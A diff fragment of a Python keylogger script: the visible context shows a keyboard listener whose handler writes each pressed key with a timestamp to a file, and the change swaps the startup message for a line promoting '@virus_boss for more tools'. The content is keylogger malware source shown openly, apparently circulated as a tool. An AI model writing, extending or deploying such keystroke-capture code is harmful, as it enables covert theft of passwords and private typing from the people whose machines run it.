@@ -12,7 +12,7 @@ def on_press(key):
             f.write(f"{datetime.datetime.now()} - {key}\n")
 
 def main():
-    print("🎯 Keylogger started. Press ESC to stop.")
+    print("🎯 Keylogger started. Follow 🅾 @virus_boss for more tools ")
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
